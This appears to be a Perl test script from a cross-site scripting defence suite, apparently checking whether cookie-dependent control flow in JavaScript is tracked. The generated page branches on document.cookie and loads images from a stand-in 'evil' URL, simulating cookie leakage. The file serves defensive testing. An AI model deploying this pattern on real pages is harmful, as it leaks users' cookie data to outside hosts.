#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_CALL";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var url = "";
		var notevil = 42;
		var evil = 3;
		if ($evil) {
			evil = 4;
		}
		
		// shouldn't be evil
		
		function testfunc() {
			url = "$imgevilurl?normal="; 
		}		
		testfunc();
		document.images[0].src = url;
		
		// if with evil val
		
		function testfunc2() {
			url = "$imgevilurl?if=";
		}
		if ($evil) {
			testfunc2();
		}
		document.images[1].src = url;
		
		// normal usage
		
		if ($evil) {
			function testfunc3() {
				url = "$imgevilurl?isevil=";
			}
		}
		testfunc3();
		document.images[2].src = url;
		
    </script>
|;

require "xss_basic_footer.pl";